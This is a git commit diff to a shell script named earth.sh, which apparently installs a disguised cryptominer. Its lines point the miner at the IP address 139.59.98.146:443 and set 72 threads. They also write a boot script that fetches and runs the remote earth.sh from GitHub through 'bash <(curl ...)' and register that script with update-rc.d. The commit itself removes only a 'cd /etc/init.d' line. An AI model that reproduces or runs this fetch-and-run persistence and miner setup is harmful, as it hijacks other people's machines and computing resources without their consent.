b2a91112b03289abf472086619a4dfae197ef6fb
merisye <meriysella44@gmail.com>
2024-06-15 09:37:48 +0700

    Update earth.sh

--- earth.sh
+++ earth.sh
@@ -6,7 +6,6 @@ mv layer $variable1
 sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./shell.sh
 sed -i "s/host/139.59.98.146:443/g" ./shell.sh
 sed -i "s/cpu-off/thread 72/g" ./shell.sh
-cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/toolsas/shard/main/earth.sh)" > stone.sh
 chmod a+x stone.sh
 update-rc.d stone.sh defaults
